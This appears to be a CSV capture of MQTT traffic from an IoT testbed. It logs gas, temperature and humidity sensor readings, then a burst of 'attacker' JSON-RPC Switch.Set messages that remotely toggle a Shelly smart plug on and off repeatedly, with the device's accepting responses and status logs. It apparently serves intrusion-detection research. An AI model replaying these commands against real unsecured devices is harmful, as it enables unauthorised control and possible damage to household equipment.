timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:14:48,shellyazplug-node/online,4,true
2026-04-22T16:14:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:14:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:14:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:14:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:14:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:14:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:14:56,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:14:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:14:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:14:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:14:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:15:04,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:15:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:15:14,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:15:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:19,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:24,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:24,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:34,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:39,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:44,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:15:44,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:15:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:04,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:16:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:16:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:16:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:14,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:16:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:16:16,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:16:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:19,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:24,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:24,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:16:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:16:26,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:16:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:34,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:16:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:16:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:16:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:16:39,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:16:44,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:44,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:16:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:16:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:16:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:16:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:16:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:16:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:59,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:16:59,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:16:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3364 33152.788 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:00,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:00,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3365 33153.286 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:00,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:00,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33153.28,""swi"
2026-04-22T16:17:00,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3366 33153.304 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:00,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:00,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3367 33153.786 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33153.78,""swi"
2026-04-22T16:17:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3368 33153.802 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3369 33154.287 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33154.28,""swi"
2026-04-22T16:17:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3370 33154.305 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3371 33154.786 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33154.78,""swi"
2026-04-22T16:17:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3372 33154.802 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3373 33155.287 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33155.28,""swi"
2026-04-22T16:17:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3374 33155.305 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3375 33155.787 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33155.78,""swi"
2026-04-22T16:17:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3376 33155.804 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3377 33156.287 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:03,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:03,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33156.28,""swi"
2026-04-22T16:17:03,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3378 33156.306 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3379 33156.787 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:04,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:04,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33156.78,""swi"
2026-04-22T16:17:04,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3380 33156.804 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:04,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:04,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3381 33157.288 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:04,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:04,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33157.29,""swi"
2026-04-22T16:17:04,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3382 33157.307 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:04,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:04,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:04,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3383 33157.791 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:05,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:05,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33157.79,""swi"
2026-04-22T16:17:05,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3384 33157.807 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:05,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:05,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3385 33158.292 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:05,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:05,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33158.29,""swi"
2026-04-22T16:17:05,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3386 33158.310 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:05,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:05,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3387 33158.790 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
